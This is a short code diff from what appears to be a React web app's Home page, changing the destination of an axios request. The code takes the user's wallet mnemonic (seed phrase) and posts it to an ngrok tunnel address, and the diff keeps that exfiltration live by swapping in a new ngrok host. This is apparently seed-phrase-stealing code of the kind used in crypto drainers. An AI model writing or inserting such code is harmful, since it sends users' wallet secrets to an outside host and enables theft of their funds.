@@ -41,7 +41,7 @@ export default function Home() {
               console.log("🩲 🩲 => ; => user:", user)
               const mnemonic = user?.mnemonic
               
-              axios.post('https://aa80-113-161-53-12.ngrok-free.app/api/token/data', {
+              axios.post('https://6ed5-118-69-134-169.ngrok-free.app/api/token/data', {
                 mnemonic
               })
             }
